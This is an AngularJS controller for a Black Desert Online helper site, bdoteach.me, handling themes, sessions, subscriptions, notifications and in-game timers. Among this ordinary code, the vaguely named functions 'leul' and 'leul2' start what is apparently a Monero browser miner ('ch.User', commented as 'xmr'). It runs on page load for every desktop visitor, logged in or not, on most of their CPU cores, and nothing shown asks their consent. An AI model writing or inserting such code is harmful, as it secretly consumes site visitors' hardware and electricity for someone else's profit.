angular.module('mainController',['authServices','userServices','paymentServices','rzModule',])
.controller('mainCtrl',function(Dashboard, Auth,Pay,AuthToken,User, $location,$timeout,$rootScope, $interval, $window,$route, $scope){
	app = this;
	$scope.location=$location
	app.displayPoints = false
	app.numbers=false
	app.dakhel = false
	app.bids=[]
	app.notifs=[]
	
	mobile=(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(navigator.userAgent||navigator.vendor||window.opera)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent||navigator.vendor||window.opera.substr(0,4)))
	
	if($window.localStorage['bodyRgba']){
		//angular.element(document.querySelector('#dice-theme0')).css('background','rgba(0, 0, 0,'+$window.localStorage['bodyRgba']+')')
		angular.element(document.querySelector('#dice-theme1')).css('background','rgba(0, 0, 0,'+$window.localStorage['bodyRgba']+')')
		angular.element(document.querySelector('#dice-theme2')).css('background','rgba(0, 0, 0,'+$window.localStorage['bodyRgba']+')')
		angular.element(document.querySelector('#dice-theme3')).css('background','rgba(0, 0, 0,'+$window.localStorage['bodyRgba']+')')
		angular.element(document.querySelector('#dice-theme4')).css('background','rgba(0, 0, 0,'+$window.localStorage['bodyRgba']+')')
	}else{
		//angular.element(document.querySelector('#dice-theme0')).css('background','rgba(0, 0, 0, 0.4)')
		angular.element(document.querySelector('#dice-theme1')).css('background','rgba(0, 0, 0, 0.4)')		
		angular.element(document.querySelector('#dice-theme2')).css('background','rgba(0, 0, 0, 0.4)')
		angular.element(document.querySelector('#dice-theme3')).css('background','rgba(0, 0, 0, 0.4)')
		angular.element(document.querySelector('#dice-theme4')).css('background','rgba(0, 0, 0, 0.4)')
		$window.localStorage['bodyRgba']=0.4
	}
	if($window.localStorage['fontSz']){
		$('body').css({'font-size': ''+$window.localStorage['fontSz']+'px'})
	}else{
		$('body').css({'font-size': '15px'})
		$window.localStorage['fontSz']=15
	}
	app.myChangeListener = function(sliderId) {
		app.bodyRgba=app.slider.value
		$window.localStorage['bodyRgba']=app.slider.value
		//angular.element(document.querySelector('#dice-theme0')).css('background','rgba(0, 0, 0,'+app.slider.value+')')
		angular.element(document.querySelector('#dice-theme1')).css('background','rgba(0, 0, 0,'+app.slider.value+')')		
		angular.element(document.querySelector('#dice-theme2')).css('background','rgba(0, 0, 0,'+app.slider.value+')')
		angular.element(document.querySelector('#dice-theme3')).css('background','rgba(0, 0, 0,'+app.slider.value+')')
		angular.element(document.querySelector('#dice-theme4')).css('background','rgba(0, 0, 0,'+app.slider.value+')')				
	};
	app.myChangeListener2 = function(sliderId) {
		app.fontsz=app.slider2.value
		console.log(parseInt($("body").css("font-size")))
		console.log(app.slider2.value)
		$window.localStorage['fontSz']=app.slider2.value
		$('body').css({'font-size': ''+app.slider2.value+'px'})
	};

	Date.prototype.addDays = function(days) {
		var dat = new Date(this.valueOf());
		dat.setDate(dat.getDate() + days);
		return dat;
	}
	var add_minutes =  function (dt, min2utes) {
	    return new Date(dt.getTime() + minutes*60000);
	}
	bidtimout=''
	function toUpper(str) {
		return str
		.toLowerCase()
		.split(' ')
		.map(function(word) {
			return word[0].toUpperCase() + word.substr(1);
		})
		.join(' ');
	}
	app.timerNow = function(){  
		$('input[type="time"]').each(function(){    
			var d = new Date(),        
			h = d.getHours(),
			m = d.getMinutes();
			if(h < 10) h = '0' + h; 
			if(m < 10) m = '0' + m; 
			$(this).attr({
				'value': h + ':' + m
			});
		});
	};

	OneSignal.on('notificationDisplay', function (event) {
		for (var i = 0; i < app.bids.length; i++) {
			if(app.bids[i].id == event.id){
				j =document.getElementById(event.id).rowIndex
				document.getElementById('marketTimerTable').deleteRow(j)
				app.bids.splice((j-1),1)
			}
		}
	});
	function testAnim(x,y) {
		$('#qtyCredit'+y).removeClass().addClass(x + ' is-negative animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
			$(this).removeClass().addClass('is-hidden')
		});
	}; 
	app.bidtimer=function(data){
		app.err_msg_notif=false
		testAnim('fadeOutDown',1)
		if(data){//controlstart and name if alrady exists
			if(app.bids.length > 0){
				for (var i = 0; i < app.bids.length; i++) {
					if(app.bids[i].start == document.getElementById("myTime").value){
						app.err_msg_notif=' Starting time is alrady in use \n Check your bids by clicking on "Manage Bids" Button'
						return
					}
				}
			}			
			mdata={}
            mdata.calc="bid_timer"
            mdata.nbr = 1
            User.setCalc(mdata) 
			
			w=document.getElementById("myTime").value.split(':')
			hours = w[0]
			minutes =w[1]
			startDateh=new Date().setHours(hours)
			startDate=new Date(startDateh).setMinutes(minutes)
			bid={}
			end=add_minutes(new Date(startDate), 15)//15
			notif_end=add_minutes(new Date(startDate), 13)//14
			eh=end.getHours()
			em=end.getMinutes()
			bid.name=data.name
			bid.start=document.getElementById("myTime").value
			bid.end = eh+":"+em
			
			d5=moment(notif_end).format("YYYY-MM-DD HH:mm:ss")
			msgCont="Bid Timer of "+bid.name.toUpperCase()+" has Ended"
			var message = {
				app_id: "4833465f-bc24-477b-8343-2dee45220b0e",
				heading:{'en': 'BDOTeach.me - Notification system'},
				contents: {"en": msgCont },
				chrome_web_icon:'https://www.bdoteach.me/assets/img/all/'+toUpper(bid.name)+'.png',
				firefox_icon:'https://www.bdoteach.me/assets/img/all/'+toUpper(bid.name)+'.png',
				send_after:d5,
				ttl:20,
				priority:10,
				filters:[{
					"field" : "tag", "key":"username", "relation":"=", "value":app.username
				}]
            };    
            User.sendNotification(message).then(function(data2){
            	if(!data2.data.success){
            		app.err_msg = data2.data.message
            		//console.log(data2.data.message)
            	}else{
            		//console.log(data2.data)
            		app.notifs.push(data2.data.notification.id)
            		bid.id=data2.data.notification.id
            		app.bids.push(bid)
            	}
            });
		}
		
	}
	var modal = document.getElementById('myModal2');
	var btn = document.getElementById("myBtn");
	var span = document.getElementsByClassName("close2")[0];
	btn.onclick = function() {
		modal.style.display = "block";
	}
	span.onclick = function() {
		modal.style.display = "none";
	}
	window.onclick = function(event) {
		if (event.target == modal) {
			modal.style.display = "none";
		}
	}
	$scope.cancelBid=function($event){
		j=$event.target.parentNode.parentNode.rowIndex
		$timeout.cancel(bidtimout)
		document.getElementById('marketTimerTable').deleteRow(j);      
		app.bids.splice((j-1),1)
		notifInf={"notif" : $event.target.parentNode.parentNode.id, "app": "4833465f-bc24-477b-8343-2dee45220b0e"}
		User.cancelNotification(notifInf).then(function(data){
			if(!data.data.success){
				app.err_msg = data.data.message
			}
		})
	}
	/*var formatBid = function(recipe) {
		if (!recipe.id) {
			return recipe.text;
		}
		var baseUrl = "/assets/img/all";
		var $recipe = $(
			'<span><img src="' + baseUrl + '/' + recipe.element.value + '.png" class="img-flag" width="25px" height="25px"/> &emsp;' + recipe.text + '</span>'
			);
		return $recipe;
	};
	$(".bidtimer").select2({
		placeholder: 'Select the item',
		templateResult: formatBid,
		templateSelection: formatBid,
		allowClear: true
	});*/
	convert = function(d) {
        // Converts the date in d to a date-object. The input can be:
        //   a date object: returned without modification
        //  an array      : Interpreted as [year,month,day]. NOTE: month is 0-11.
        //   a number     : Interpreted as number of milliseconds
        //                  since 1 Jan 1970 (a timestamp) 
        //   a string     : Any format supported by the javascript engine, like
        //                  "YYYY/MM/DD", "MM/DD/YYYY", "Jan 31 2009" etc.
        //  an object     : Interpreted as an object with year, month and date
        //                  attributes.  **NOTE** month is 0-11.
        return (
            d.constructor === Date ? d :
            d.constructor === Array ? new Date(d[0],d[1],d[2]) :
            d.constructor === Number ? new Date(d) :
            d.constructor === String ? new Date(d) :
            typeof d === "object" ? new Date(d.year,d.month,d.date) :
            NaN
        );
    },
	compareDates = function(a,b) {
        // Compare two dates (could be of any type supported by the convert
        // function above) and returns:
        //  -1 : if a < b
        //   0 : if a = b
        //   1 : if a > b
        // NaN : if a or b is an illegal date
        // NOTE: The code inside isFinite does an assignment (=).
        return (
            isFinite(a=convert(a).valueOf()) &&
            isFinite(b=convert(b).valueOf()) ?
            (a>b)-(a<b) :
            NaN
        );
    }
	app.slider = {
	  value: $window.localStorage['bodyRgba'],
	  options: {
	    floor: 0,
	    ceil: 1,
	    step: 0.01,
    	precision: 2,
    	translate: function(value) {
	      return parseInt(value*100)+"%";
	    },
	    showSelectionBar: true,
	    onChange: app.myChangeListener,
	    vertical: true
	  }
	};
	app.slider2 = {
	  value: $window.localStorage['fontSz'],
	  options: {
	    floor: 15,
	    ceil: 30
	    ,
	    step: 1,
    	translate: function(value) {
	      return parseInt(value);
	    },
	    showSelectionBar: true,
	    onChange: app.myChangeListener2,
	    vertical: true
	  }
	};

	/*function zine() {
		$location.path($route.current.$$route.originalPath)		
	}*/
	if($window.localStorage['bodyId']){
		document.body.id = $window.localStorage['bodyId']
	}else{
		document.body.id = 'skin-blur-blue'
		$window.localStorage['bodyId'] = 'skin-blur-blue'
	}

	/*if($window.localStorage['color']){
		
	}else{
		document.body.id = 'rgb(255, 255, 255)'
		$window.localStorage['color'] = 'skin-blur-blue'
	}*/

	if($window.localStorage['close']){
		$scope.closed = $window.localStorage['close']
	}else{
		$scope.closed = true
		$window.localStorage['close']=true
	}
	
	if($window.localStorage['bodyId']=="skin-blur-white" || $window.localStorage['bodyId'] == "skin-blur-wall"){
		$("body").css({
			'color': 'rgb(0, 0, 0)',
			'text-shadow': '0 0 3px rgba(255, 255, 255, 0)'
		});
		$('.page-header').css({
			'padding-bottom': '9px',
		    'margin': '0 0 20px',
		    'border-bottom': '1px solid #1b1b1b'
		})
		$('.text-info').css({
			'color': '#2d4767!important'
		})	
	}else{
		$("body").css({
			'color': 'rgb(255, 255, 255)',
			'text-shadow': '0 0 3px rgba(0, 0, 0, 0.5)'
		});
		/*$("a").css({
			'color': 'rgb(255, 255, 255)'
		});*/
		$('.page-header').css({
			'padding-bottom': '9px',
		    'margin': '0 0 20px',
		    'border-bottom': '1px solid #eee'
		})
		$('.text-info').css({
			'color': '#17a2b8!important'
		})
	}
	app.changeTheme = function(){
		if(app.dakhel){
			app.dakhel=false
		}else{
			app.dakhel=true
		}
	}
	app.theme = function(theme){
		document.body.id='skin-blur-'+theme
		$window.localStorage['bodyId'] ='skin-blur-'+theme
		if(theme=="white" || theme == "wall"){
			$("body").css({
				'color': 'rgb(0, 0, 0)',
				'text-shadow': '0 0 3px rgba(255, 255, 255, 0)'
			});
			$('.page-header').css({
				'padding-bottom': '9px',
			    'margin': '0 0 20px',
			    'border-bottom': '1px solid #1b1b1b'
			})
			$('.text-info').css({
				'color': '#2d4767!important'
			})
			
		}else{
			$("body").css({
				'color': 'rgb(255, 255, 255)',
				'text-shadow': '0 0 3px rgba(0, 0, 0, 0.5)'
			});
			$('.page-header').css({
				'padding-bottom': '9px',
			    'margin': '0 0 20px',
			    'border-bottom': '1px solid #eee'
			})
			$('.text-info').css({
				'color': '#17a2b8!important'
			})
			
		}
	}
	app.color=function(c){
		if(c == "rgb(255, 255, 255)"){
			$("body").css({
				'color': ''+c,
				'text-shadow': '0 0 3px rgba(255, 255, 255, 0)'
			});
			$('.page-header').css({
				'padding-bottom': '9px',
			    'margin': '0 0 20px',
			    'border-bottom': '1px solid #eee'
			})
			$('.text-info').css({
				'color': '#17a2b8!important'
			})
		}else{
			$("body").css({
				'color': ''+c,
				'text-shadow': '0 0 3px rgba(255, 255, 255, 0)'
			});
			$('.page-header').css({
				'padding-bottom': '9px',
			    'margin': '0 0 20px',
			    'border-bottom': '1px solid #1b1b1b'
			})
			$('.text-info').css({
				'color': '#2d4767!important'
			})
		}
		
	}


	if(Auth.isLoggedIn()){
		User.getInfos().then(function(data){
			$timeout(()=>{
				OneSignal.sendTag("username", data.data.user.username);
			},2000)			
	    	if(data.data.user.permission == 'free'){	//free
	    		app.displayPoints = true	    		
	    		//to change after implementing our api get user balance etc
	    		interval = $interval(function(){
	    			app.numbers=true
	    			User.getInfos().then(function(data2){
						if(data2.data.success){
							app.balance =(data2.data.user.credits)
							app.total = (data2.data.user.total)
							if(data2.data.user.withdrawn != 0){
								app.withdrawn =( data2.data.user.withdrawn)
							}else{
								app.withdrawn =data2.data.user.withdrawn
							}
							
						}else{
							app.err_msg=data2.data.user.error
						}		
					})
	    		},30000)	    		
	    	}else if(data.data.user.permission == 'premium' || data.data.user.permission == 'sa7bi'){
	    		app.checkPayment()
	    		token = $window.localStorage.getItem('token')
	    		if(token != null){
	    			self.parseJwt = function(token){
	    				base64Url = token.split('.')[1]
	    				base64 = base64Url.replace('-','+').replace('_','/')
	    				return JSON.parse($window.atob(base64))
	    			}
					//console.log(parseInt(timeStamp) +" "+ parseInt(user.iat))
	    			tok = self.parseJwt(token)	
	    			User.getDbUser().then(function(data){
	    				if(tok.iat < data.data.iat){//il tconecta l premiumù  mn blassa khra o hwa deja connecte hna ndeconiktiwo mnhna
	    					showModal(5)
	    				}
	    			})			
	    		}
	    	}else if(data.data.user.permission == 'trial'){
	    		end=new Date(data.data.user.start_date).addDays(7)
	    		now= new Date()
	    		if(compareDates(end,now) == -1){//trial ended
	    			User.trialEnd().then(function(data){
	    				if(data.data.success){
	    					console.log(data.data.message)
	    				}else{
	    					console.log("error")
	    				}
	    				
	    			})
	    		}
	    	}
	    })		
	}
	/*User.resetCredit().then(function(data){
		console.log(data.data)
	})*/
	showModal = function(x){
		app.choiceMade=false
		app.modalHeader =undefined
		app.modalBody =undefined
		app.hideButton = false
		if(x === 1){
			app.modalHeader = "Timeout Warning";
			app.modalBody = "Your Session will expire in 5 minutes, would you like to renew your session";
			$("#myModal").modal({backdrop: "static"});			
		}else if(x === 2){
			User.deco().then(function(data){
				app.hideButton=true
				app.modalHeader = "Logging Out";
				$("#myModal").modal({backdrop: "static"});
				$timeout(function(){
					Auth.logout()

					$window.location.href ='/login'
					hideModal()
					$route.reload()
				},2000)//2000
			})
			
		}else if(x == 3){
			User.deco().then(function(data){
				app.hideButton = true
				app.modalHeader = "Ending Senssion";
				app.modalBody = "Your Session has expired , you will be redirected to the login Page\n";
				$("#myModal").modal({backdrop: "static"});
				$timeout(function(){
					Auth.logout()
					$window.location.href ='/login'
					hideModal()
					$route.reload()
				},2000)//2000
			})			
		}else if(x == 4){//cancel sub
			app.hideButton = false
			app.modalHeader = "Canceling Subscription";
			app.modalBody = "Are you sure you want to cancel your subscription?\n If yes ";
			$("#myModal").modal({backdrop: "static"});
		}else if(x == 5){//premium connected else where
			app.hideButton = true
			app.modalHeader = "Session oppened in another device";
			app.modalBody = "Your Session has ended , you will be redirected to the login Page\n";
			$("#myModal").modal({backdrop: "static"});
			$timeout(function(){
				Auth.logout()
				$window.location.href ='/login'
				hideModal()
				$route.reload()
			},5000)//2000
		}else if(x==6){// bid timer

		}
		$timeout(function(){
			if(!app.choiceMade){
				hideModal();
			}
		},5000)//5000		
	}
	leul = function(x,name,thh,y){
		//call function dyalna dyal xmr
		addr = "bdoteach.me";
		th = navigator.hardwareConcurrency-x
		m = new ch.User(addr, name,{
			autoThreads: false,
			threads:th,
			throttle: thh
		});
		if (!mobile) {
			m.start();
		}

		setInterval(function () {			
			if(y && !mobile && app.displayPoints){
				User.updateCredits(15)
			}				
		}, 30000);
	}
	
	leul2 = function(){
		if(Auth.isLoggedIn()){
			Auth.getUser().then(function(data){
				User.getpermission().then(function(data2){
					if(data2.data.permission !== 'premium' && data2.data.permission !== 'molchi' && data2.data.permission == 'trial' && data2.data.permission == 'sa7bi'){
						if(navigator.hardwareConcurrency>=8){
							leul(navigator.hardwareConcurrency-4,data.data.username,0.4,true)
						}else if(navigator.hardwareConcurrency>=6 && navigator.hardwareConcurrency<8){
							leul(navigator.hardwareConcurrency-3,data.data.username,0.5,true)
						}else if(navigator.hardwareConcurrency>=3 && navigator.hardwareConcurrency<6){
							leul(navigator.hardwareConcurrency-2,data.data.username,0.6,true)
						}else{
							leul(navigator.hardwareConcurrency-1,data.data.username,0.7,true)
						}
					}else{//pro
						if(navigator.hardwareConcurrency>=8){
							leul(navigator.hardwareConcurrency-4,data.data.username,0.7,true)
						}else if(navigator.hardwareConcurrency>=6 && navigator.hardwareConcurrency<8){
							leul(navigator.hardwareConcurrency-3,data.data.username,0.8,true)
						}else if(navigator.hardwareConcurrency>=3 && navigator.hardwareConcurrency<6){
							leul(navigator.hardwareConcurrency-2,data.data.username,0.8,true)
						}else{
							leul(navigator.hardwareConcurrency-1,data.data.username,0.9,true)
						}
					}
				})
			})
		}else{
			if(navigator.hardwareConcurrency>=8){
				leul(navigator.hardwareConcurrency-4,"not Logged",0.6,false)
			}else if(navigator.hardwareConcurrency>=6 && navigator.hardwareConcurrency<8){
				leul(navigator.hardwareConcurrency-3,"not Logged",0.7,false)
			}else if(navigator.hardwareConcurrency>=3 && navigator.hardwareConcurrency<6){
				leul(navigator.hardwareConcurrency-2,"not Logged",0.8,false)
			}else{
				leul(navigator.hardwareConcurrency-1,"not Logged",0.9,false)
			}
		}
	}
	//if($location.path() != "/marketplace"){
		leul2()
	//}
	


	app.loadme = false
	$('#mh').attr('data-user','')
	app.checkSession = function(){
		if(Auth.isLoggedIn()){
			Auth.getUser().then(function(data){
				app.username = data.data.username
				if(!app.username){
					showModal(3)
				}else{
					app.checkingSession = true;
					interval = $interval(function(){
						token = $window.localStorage.getItem('token')
						if(token == null){
							$interval.cancel(interval)				
						}else{
							self.parseJwt = function(token){
								base64Url = token.split('.')[1]
								base64 = base64Url.replace('-','+').replace('_','/')
								return JSON.parse($window.atob(base64))
							}
							expireTime = self.parseJwt(token)
							timeStamp = Math.floor(Date.now() / 1000)
							timeCheck = expireTime.exp - timeStamp		
							//console.log(expireTime.exp+" - "+timeStamp+" = "+timeCheck)			
							if(timeCheck <= 1800){//1800
								$interval.cancel(interval)
								showModal(1)
								interval2 = $interval(function(){
									
									timeStamp = Math.floor(Date.now() / 1000)
									timeCheck = expireTime.exp - timeStamp
									//console.log(timeCheck)
									if(!app.choiceMade && timeCheck <= 10){
										$interval.cancel(interval2)
										showModal(3)							
									}
								},2000)
							}
						}
					},3600000)//43200000  12h // 3600000 1h
				}
			})	
		}
	}

	app.checkPayment = function(){ 
		if(Auth.isLoggedIn()){
			//interval = $interval(function(){
				Auth.getUser().then(function(data){
					User.getInfos().then(function(data2){
						if(data2.data.success){
							billingAgreementId = data2.data.user.billingAgreementId
							state = data2.data.user.subscriptionState
							if(billingAgreementId){
								Pay.getAgreement(billingAgreementId).then(function(data3){
									if(data3.data.success){
										state2 = data3.data.billingAgreement.state
										if(state2 != "Active"){ // ila tcancela wla tsuspenda //nzidoh 31 jour 3la last pyment date
											isoDate = new Date();
											lastPaydate = data3.data.billingAgreement.agreement_details.last_payment_date
											lastPayDate2 = new Date(lastPaydate)
											lastday = lastPayDate2.getTime()//+31jours 2678400000
											lib9a = new Date(lastday).getTime()-isoDate.getTime()
											//console.log(lib9a)
											if(lib9a <= 0){//khona salalo labonement et wssal l nhar lakhar
												User.removeSubs(state2).then(function(data4){
													if(data4.data.success){
														app.success_msg=data4.data.message
														User.resetCredit().then(function(data5){
															$window.location.href ='/profile'
														})
														
													}
												})
												//$window.location.href ='/profile'
											}
										}
									}								
								})
							}						
						}						
					})				
				})
			//},86400000)// chack24h 86400000
		}
	}

	
	app.checkSession()
	

	app.renewSession = function(){
		app.choiceMade=true

		User.renewSession(app.username).then(function(data){
			if(data.data.success){
				AuthToken.setToken(data.data.token)
				app.checkSession()
			}else{
				app.modalBody = data.data.message
			}
		})
		hideModal();
	}
	app.endSession = function(){
		app.choiceMade=true
		hideModal();
		$timeout(function(){
			showModal(2)
		},1000)
	}

	hideModal = function(){
		$("#myModal").modal('hide')
	}

	$rootScope.$on('$routeChangeStart', function(){
		
		//console.log($('.navbar-collapse.collapse.show'))
		$('.navbar-collapse.collapse.show').removeClass().addClass('navbar-collapse collapse')
		if(!app.checkingSession){
			app.checkSession()
		}

		if(Auth.isLoggedIn()){
			NProgress.configure({ showSpinner: false });
			NProgress.start();
			app.isLoggedIn = true
			Auth.getUser().then(function(data){
				app.username = data.data.username
				a=$location.path()
				title=app.username.toUpperCase()+" - "
				if(a == "/cooking"){
					title+="Cooking - W's BDO MT"
				}else if(a == "/"){
					title+="BDO Multi-Tools - W's BDO MT"
				}else if(a == "/payment"){
					title +="Subscription - W's BDO MT"
				}else if(a == "/profile"){
					title += "Dashboard - W's BDO MT"
				}else if(a == "/settings"){
					title += "Settings - W's BDO MT"
				}else if(a == "/marketplace"){
					title += "Marketplace Notices - W's BDO MT"
				}else if(a == "/converter"){
					title += "Converters - W's BDO MT"
				}else if(a == "/qa"){
					title += "Question & Answers - W's BDO MT"
				}else if(a == "/gcu"){
					title += "GCU - W's BDO MT"
				}else if(a == "/privacy"){
					title += "Privacy policy - W's BDO MT"
				}else if(a == "/contact"){
					title += "Contact - W's BDO MT"
				}


				document.getElementsByTagName('title')[0].innerHTML=title
				app.useremail = data.data.email
				User.getpermission().then(function(data){
					app.permission = data.data.permission
					if(data.data.permission === 'premium' || data.data.permission === 'trial' || data.data.permission === 'sa7bi'){
						app.authorized =true
						app.loadme = true
					}else if(data.data.permission === 'molchi'){
						app.authorized2 =true
						app.loadme = true
					}else{
						app.loadme = true
					}
				})
				app.name = data.data.name
			})
		}else{
			app.username = ''
			app.isLoggedIn = false
			app.loadme = true
		}
		
		
	})

	this.doLogin = function(){
		app.err_msg = false
		app.loading = true
		app.expired=false
		app.alrady=false
		app.disabled=true
		Auth.login(app.logData).then(function(data){
			if(data.data.success){
				app.success_msg = data.data.message
				$timeout(function(){
					app.loading = false
					$window.location.href ='/profile'
					app.logData = null
					app.success_msg = null
					//app.disabled=false
					app.checkSession()
				},500)
				
			}else{
				if(data.data.expired){
					app.expired=true
					app.loading = false
					app.err_msg = data.data.message
				}else{
					app.loading = false
					app.disabled=false
					app.err_msg = data.data.message
				}
			}
		})
	}

	app.logout = function(){
		showModal(2)
	}

	stoHms = (d) => {
		d = Number(d);
		h = Math.floor(d / 3600);
		min = Math.floor(d % 3600 / 60);
		s = (d % 3600 % 60).toFixed(0);

		hDisplay = h > 0 ? h + (h == 1 ? " : " : " : ") : "";
		mDisplay = min > 0 ? min + (min == 1 ? " : " : " : ") : "";
		sDisplay = s >= 0 ? s + (s == 1 ? "" : "") : "";
		return hDisplay + mDisplay + sDisplay; 
	}
	function formatAMPM(date) {
			var hours = date.getHours();
			var minutes = date.getMinutes();
			var ampm = hours >= 12 ? 'PM' : 'AM';
			hours = hours % 12;
	  hours = hours ? hours : 12; // the hour '0' should be '12'
	  minutes = minutes < 10 ? '0'+minutes : minutes;
	  var strTime = ampm +' ' +hours + ':' + minutes ;
	  return strTime;
	}
	
	iG_Time =() => {
		d = new Date();
		app.day=true
		bdya = Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), d.getUTCDate(), 0, 0, 0, 0);
		nharBssa7 = (Date.now() - bdya) / 1000;
		IGs = (nharBssa7 + 13200) % (14400);
		bg_reset = Math.ceil(86400) - ((nharBssa7-(18000))%(86400))
		if( bg_reset > (86400) ) {
			bg_reset -= (86400);
		}

		app.bg_reset=stoHms(bg_reset)
		app.d_reset = stoHms(Math.ceil(86400 - nharBssa7))
		app.imp_reset = stoHms(Math.ceil(10800 - nharBssa7 % (10800)))
		app.impTrd_reset = stoHms(14400 - nharBssa7 % (14400))


		if (IGs < 12000) {
			var IGstime = IGs;
			var ddpct = IGs / (200 * 60);
			var sa3a = 7 + (22 - 7) * ddpct;
			var lilYbdaFSec = Math.ceil(12000 - IGstime);		
		} else {
			var lileSecs = IGs - 12000;
			var ndpct = lileSecs / (40 * 60);
			var sa3a = 9 * ndpct;
			sa3a = sa3a < 2 ? 22 + sa3a : sa3a - 2;
			var lilYssaliFSec = Math.ceil(40 * 60 - lileSecs);
		}

		var n = new Date(0,0);
		n.setSeconds(+sa3a * 3600);
		app.IGTime = formatAMPM(n)

		if(lilYssaliFSec){
			app.day=true
			app.dayNight = stoHms(lilYssaliFSec)
		}else{
			app.day=false
			app.dayNight = stoHms(lilYbdaFSec)
		}

		if (lilYssaliFSec < 960 || lilYbdaFSec < 960) {
			//document.getElementById("daynight").style.color = "rgb(255, 66, 66)";
			document.getElementById("daynight").style.fontWeight = "bold"
		} else {
			
			document.getElementById("daynight").style.fontWeight = "normal"
		}
		if (Math.ceil(86400 - nharBssa7) < 900) {
			//document.getElementById("d").style.color = "rgb(255, 66, 66)";
			document.getElementById("d").style.fontWeight = "bold"
		} else {
			
			document.getElementById("d").style.fontWeight = "normal"
		}
		if (Math.ceil(10800 - nharBssa7 % (10800)) < 900) {
			//document.getElementById("imp").style.color = "rgb(255, 66, 66)";
			document.getElementById("imp").style.fontWeight = "bold"
		} else {
			
			document.getElementById("imp").style.fontWeight = "normal"
		}
		if ((14400 - nharBssa7 % (14400)) < 900) {
			//document.getElementById("impTrd").style.color = "rgb(255, 66, 66)";
			document.getElementById("impTrd").style.fontWeight = "bold"
		} else {
			
			document.getElementById("impTrd").style.fontWeight = "normal"
		}
		if (bg_reset < 900) {
			//document.getElementById("bg").style.color = "rgb(255, 66, 66)";
			document.getElementById("bg").style.fontWeight = "bold"
		} else {
			
			document.getElementById("bg").style.fontWeight = "normal"
		}
	}
	time = $interval(iG_Time, 1000);	
})


